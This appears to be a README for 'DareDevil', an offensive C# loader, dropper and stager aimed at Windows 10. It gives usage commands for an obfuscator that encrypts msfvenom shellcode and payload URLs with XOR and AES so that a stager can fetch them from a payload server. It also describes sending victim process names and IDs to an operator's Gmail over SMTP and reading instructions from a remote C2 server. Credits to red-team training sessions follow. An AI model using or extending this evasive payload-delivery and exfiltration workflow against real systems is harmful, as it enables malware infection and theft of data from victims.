# DareDevil
Stealthy Loader-cum-dropper/stage-1/stager targeting Windows10

### Tools usage:

Obfuscator/encrypt.cs:
1. [For shellcode extraction and encryption]: place it in the directory in which .bin file is present.
2. [For url encryption]: Nothing! Just paste and run.

Example:
```
It can encrypt 'shellcode' and 'url' to xor, aes, aes_xor and aes_xor_b64:

// Creating .bin file and Extracting shellcode from .bin file:
// Creating: https://ivanitlearning.wordpress.com/2018/10/14/shellcoding-with-msfvenom/
// Extract: 
cmd> encrypt.exe /file:file.bin /out:aes_xor_b64

// paste the output b64 bytes into a .txt file and upload it to payload server.
// cmd: "mv .\obfuscator\"
cmd> encrypt.exe /shellcodeurl:<url>.txt /out:aes_xor_b64

cmd> encrypt.exe /mscorliburl:<url>.exe /out:aes_xor_b64

// For Sending/ exfiltrating Victim process name and Ids to Operator Gmail via SMTP server
cmd> encrypt.exe /remotewriteurl:<url>.exe /out:aes_xor_b64

// For reading pid from pid.txt from payload server/ remote c2 server
cmd> encrypt.exe /remotereadurl:<url>.txt /out:aes_xor_b64
```

### [DareDevil] Resources and Credits:

1. I learned Reflective loader implementation from watching the _[<ins>SANS Offensive WorkShop</ins>](https://www.sans.org/offensive-operations/): ['From zero to hero: Creating a reflective loader in C#'](https://www.youtube.com/watch?v=qeOCZGuVsi4)_ by [@Jean_Maes_1994](https://twitter.com/jean_maes_1994). Also thanks to him, for answering my questions in DM, so patiently :smile:!
2. Other basics and offensive side of C# by following offensive tradecraft basics from _[<ins>DEFCON 29 Adversary Village</ins>](https://adversaryvillage.org/): ['Tradecraft Development in Adversary Simulations`](https://youtu.be/KJsVVEn4fFw)_ by [@fozavci](https://twitter.com/fozavci).
3. PInvoke:
    - [pinvoke](http://www.pinvoke.net/)
    - [specterops:Matt Hand](https://posts.specterops.io/offensive-p-invoke-leveraging-the-win32-api-from-managed-code-7eef4fdef16d)
